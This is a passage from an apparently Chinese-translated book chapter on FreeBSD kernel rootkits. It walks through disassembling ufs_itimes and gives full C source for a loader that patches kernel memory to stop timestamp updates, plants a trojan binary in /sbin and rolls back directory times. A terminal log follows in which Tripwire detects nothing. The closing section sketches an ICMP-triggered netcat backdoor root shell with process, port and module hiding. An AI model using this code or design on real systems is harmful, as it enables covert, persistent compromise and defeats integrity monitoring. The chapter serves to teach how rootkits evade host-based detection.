c06c0f0a:       89 42 44                mov    %eax,0x44(%edx)
c06c0f0d:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f10:       f6 c2 04                test   $0x4,%dl
c06c0f13:       74 45                   je     c06c0f5a <ufs_itimes+0xfa>
c06c0f15:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f18:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f1c:       0f 84 bf 00 00 00       je     c06c0fe1 <ufs_itimes+0x181>
c06c0f22:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0f25:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f2b:       89 c1                   mov    %eax,%ecx
`c06c0f2d:       89 42 28                mov    %eax,0x28(%edx)`
c06c0f30:       c1 f9 1f                sar    $0x1f,%ecx
`c06c0f33:       89 4a 2c                mov    %ecx,0x2c(%edx)`
c06c0f36:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f39:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f3d:       0f 84 8d 00 00 00       je     c06c0fd0 <ufs_itimes+0x170>
c06c0f43:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f49:       8b 46 04                mov    0x4(%esi),%eax
c06c0f4c:       89 42 40                mov    %eax,0x40(%edx)
c06c0f4f:       83 43 2c 01             addl   $0x1,0x2c(%ebx)
c06c0f53:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f56:       83 53 30 00             adcl   $0x0,0x30(%ebx)
c06c0f5a:       f6 c2 02                test   $0x2,%dl
c06c0f5d:       0f 84 30 ff ff ff       je     c06c0e93 <ufs_itimes+0x33>
c06c0f63:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f66:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f6a:       74 56                   je     c06c0fc2 <ufs_itimes+0x162>
c06c0f6c:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0f6f:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f75:       89 c1                   mov    %eax,%ecx
`c06c0f77:       89 42 30                mov    %eax,0x30(%edx)`
c06c0f7a:       c1 f9 1f                sar    $0x1f,%ecx
`c06c0f7d:       89 4a 34                mov    %ecx,0x34(%edx)`
c06c0f80:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0f83:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0f87:       74 25                   je     c06c0fae <ufs_itimes+0x14e>
c06c0f89:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f8f:       8b 46 04                mov    0x4(%esi),%eax
c06c0f92:       89 42 48                mov    %eax,0x48(%edx)
c06c0f95:       8b 53 10                mov    0x10(%ebx),%edx
c06c0f98:       e9 f6 fe ff ff          jmp    c06c0e93 <ufs_itimes+0x33>
c06c0f9d:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fa3:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fa6:       89 42 10                mov    %eax,0x10(%edx)
c06c0fa9:       e9 46 ff ff ff          jmp    c06c0ef4 <ufs_itimes+0x94>
c06c0fae:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fb4:       8b 46 04                mov    0x4(%esi),%eax
c06c0fb7:       89 42 24                mov    %eax,0x24(%edx)
c06c0fba:       8b 53 10                mov    0x10(%ebx),%edx
c06c0fbd:       e9 d1 fe ff ff          jmp    c06c0e93 <ufs_itimes+0x33>
c06c0fc2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fc8:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fcb:       89 42 20                mov    %eax,0x20(%edx)
c06c0fce:       eb b0                   jmp    c06c0f80 <ufs_itimes+0x120>
c06c0fd0:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fd6:       8b 46 04                mov    0x4(%esi),%eax
c06c0fd9:       89 42 1c                mov    %eax,0x1c(%edx)
c06c0fdc:       e9 6e ff ff ff          jmp    c06c0f4f <ufs_itimes+0xef>
c06c0fe1:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0fe7:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0fea:       89 42 18                mov    %eax,0x18(%edx)
c06c0fed:       e9 44 ff ff ff          jmp    c06c0f36 <ufs_itimes+0xd6>
c06c0ff2:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0ff8:       8b 46 04                mov    0x4(%esi),%eax
c06c0ffb:       89 42 14                mov    %eax,0x14(%edx)
c06c0ffe:       e9 0a ff ff ff          jmp    c06c0f0d <ufs_itimes+0xad>
c06c1003:       8d b6 00 00 00 00       lea    0x0(%esi),%esi
c06c1009:       8d bc 27 00 00 00 00    lea    0x0(%edi),%edi

```

在这个输出中，加粗显示的六行（在反汇编转储中）每行代表对 `DIP_SET` 的一个调用，最后两行对应于你想 `nop` 出来的那些。以下叙述详细说明了我是如何得出这个结论的。

首先，在函数 `ufs_itimes` 中，宏 `DIP_SET` 被调用六次，分为三组，每组两次。因此，在反汇编中，应该有三组类似指令。接下来，`DIP_SET` 调用都发生在调用函数 `vfs_timestamp` 之后。因此，在调用 `vfs_timestamp` 之前的任何代码都可以忽略。最后，因为宏 `DIP_SET` 修改了一个传递的参数，其反汇编（很可能是）涉及通用数据寄存器。根据这些标准，围绕每个 `sar` 指令的两个 `mov` 指令是唯一匹配的。

## 示例

列表 6-7 将 `trojan_hello` 安装到目录 /sbin/ 中，而没有更新其访问、修改或更改时间。程序首先保存 /sbin/ 的访问和修改时间。然后，函数 `ufs_itimes` 被修补以防止更新更改时间。接下来，二进制文件 `trojan_hello` 被复制到 /sbin/ 中，并将 /sbin/ 的访问和修改时间回滚。最后，函数 `ufs_itimes` 被恢复。

```
#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE            450
#define T_NAME          "trojan_hello"
#define DESTINATION     "/sbin/."

/* Replacement code. */
unsigned char nop_code[] =
        "\x90\x90\x90";         /* nop          */

int
main(int argc, char *argv[])
{
        int i, offset1, offset2;
        char errbuf[_POSIX2_LINE_MAX];
        kvm_t *kd;
        struct nlist nl[] = { {NULL}, {NULL}, };
        unsigned char ufs_itimes_code[SIZE];

        struct stat sb;
        struct timeval time[2];

        /* Initialize kernel virtual memory access. */
        kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
        if (kd == NULL) {
                fprintf(stderr, "ERROR:      %s\n", errbuf);
                exit(-1);
        }

        nl[0].n_name = "ufs_itimes";

        if (kvm_nlist(kd, nl) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (!nl[0].n_value) {
                fprintf(stderr, "ERROR: Symbol %s not found\n",
                    nl[0].n_name);
                exit(-1);
        }

        /* Save a copy of ufs_itimes. */
        if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /*
         * Search through ufs_itimes for the following two lines:
         *         DIP_SET(ip, i_ctime, ts.tv_sec);
         *         DIP_SET(ip, i_ctimensec, ts.tv_nsec);
         */
        for (i = 0; i < SIZE - 2; i++) {
                if (ufs_itimes_code[i] == 0x89 &&
                    ufs_itimes_code[i+1] == 0x42 &&
                    ufs_itimes_code[i+2] == 0x30)
                        offset1 = i;

                if (ufs_itimes_code[i] == 0x89 &&
                    ufs_itimes_code[i+1] == 0x4a &&
                    ufs_itimes_code[i+2] == 0x34)
                        offset2 = i;
        }

        /* Save /sbin/'s access and modification times. */
        if (stat("/sbin", &sb) < 0) {
                fprintf(stderr, "STAT ERROR: %d\n", errno);
                exit(-1);
        }

        time[0].tv_sec = sb.st_atime;
        time[1].tv_sec = sb.st_mtime;

        /* Patch ufs_itimes. */
        if (kvm_write(kd, nl[0].n_value + offset1, nop_code,
            sizeof(nop_code) - 1) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (kvm_write(kd, nl[0].n_value + offset2, nop_code,
            sizeof(nop_code) - 1) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }
        /* Copy T_NAME into DESTINATION. */
        char string[] = "cp" " " T_NAME " " DESTINATION;
        system(&string);

        /* Roll back /sbin/'s access and modification times. */
        if (utimes("/sbin", (struct timeval *)&time) < 0) {
                fprintf(stderr, "UTIMES ERROR: %d\n", errno);
                exit(-1);
        }

        /* Restore ufs_itimes. */
        if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
            sizeof(nop_code) - 1) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
            sizeof(nop_code) - 1) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /* Close kd. */
        if (kvm_close(kd) < 0) {
                fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
                exit(-1);
        }

        /* Print out a debug message, indicating our success. */
        printf("Y'all just mad. Because today, you suckers got served.\n");

        exit(0);
}

```

*trojan_loader.c*

### 注意

我们本可以修补 *`ufs_itimes`*（在四个额外的位置）以防止所有文件的访问、修改和更改时间更新。然而，我们希望尽可能微妙；因此，我们回滚了访问和修改时间。

# 概念验证：欺骗 Tripwire

在以下输出中，我运行了本章开发的 rootkit 对抗 Tripwire，这可能是最常见和最知名的 HIDS。

首先，我执行命令 `tripwire --check` 以验证文件系统的完整性。接下来，rootkit 被安装到 trojan 二进制文件 `hello`（位于 /sbin/ 中）。最后，我再次执行 `tripwire --check` 以审计文件系统并查看是否检测到 rootkit。

### 注意

由于 Tripwire 报告的平均内容相当详细且冗长，我已经从以下输出中省略了任何无关或冗余的信息以节省空间。

```
$ `sudo tripwire --check`
Parsing policy file: /usr/local/etc/tripwire/tw.pol
*** Processing Unix File System ***
Performing integrity check...
Wrote report file: /var/db/tripwire/report/slavetwo-20070305-072935.twr

Tripwire(R) 2.3.0 Integrity Check Report

Report generated by:          root
Report created on:            Mon Mar 5 07:29:35 2007
Database last updated on:     Mon Mar 5 07:28:11 2007
. . .

Total objects scanned:  69628
Total violations found:  0

=============================================================================
Object Summary:
=============================================================================

-----------------------------------------------------------------------------
# Section: Unix File System
-----------------------------------------------------------------------------

No violations.

=============================================================================
Error Report:
=============================================================================

No Errors
-----------------------------------------------------------------------------
*** End of report ***

Tripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered
trademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;
for details use --version. This is free software which may be redistributed
or modified only under certain conditions; see COPYING for details.
All rights reserved.
Integrity check complete.
$ `hello`
May the force be with you.
$ `sudo ./trojan_loader`
Y'all just mad. Because today, you suckers got served.
$ `sudo kldload ./incognito-0.3.ko`
$ `kldstat`
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ `ls /sbin/t*`
/sbin/tunefs
$ `hello`
May the schwartz be with you!
$ `sudo tripwire --check`
Parsing policy file: /usr/local/etc/tripwire/tw.pol
*** Processing Unix File System ***
Performing integrity check...
Wrote report file: /var/db/tripwire/report/slavetwo-20070305-074918.twr

Tripwire(R) 2.3.0 Integrity Check Report

Report generated by:          root
Report created on:            Mon Mar 5 07:49:18 2007
Database last updated on:     Mon Mar 5 07:28:11 2007
. . .

Total objects scanned:  69628
Total violations found:  0

=============================================================================
Object Summary:
=============================================================================

-----------------------------------------------------------------------------
# Section: Unix File System
-----------------------------------------------------------------------------

No violations.

=============================================================================
Error Report:
=============================================================================

No Errors

-----------------------------------------------------------------------------
*** End of report ***

Tripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered
trademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;
for details use --version. This is free software which may be redistributed
or modified only under certain conditions; see COPYING for details.
All rights reserved.
Integrity check complete.

```

太棒了——Tripwire 报告没有违规。

当然，你还可以做更多的事情来改进这个 rootkit。例如，你可以隐藏系统调用钩子（如 隐藏系统调用钩子 中讨论的）。

### 注意

离线分析会检测到木马；毕竟，如果系统没有运行，你无法在系统中隐藏！

# 结论

本章的目的是（信不信由你）并不是要诋毁 HIDS，而是要展示通过结合本书中描述的所有技术可以实现什么。为了好玩，这里还有一个例子。

将第二章中的`icmp_input_hook`代码与本章中`execve_hook`代码的部分结合起来，创建一个能够执行用户空间进程（如`netcat`）以生成后门 root shell 的“网络触发器”。然后，将其与第三章中的`process_hiding`和`port_hiding`代码结合起来，隐藏 root shell 和连接。包括本章中的模块隐藏例程以隐藏 rootkit 本身。为了安全起见，还可以加入`netcat`的`getdirentries_hook`代码。

当然，这个 rootkit 也可以进行改进。例如，由于许多管理员将他们的防火墙/数据包过滤器设置为丢弃传入的 ICMP 数据包，考虑挂钩一个不同的*`*_input`*函数，例如*`tcp_input`*。
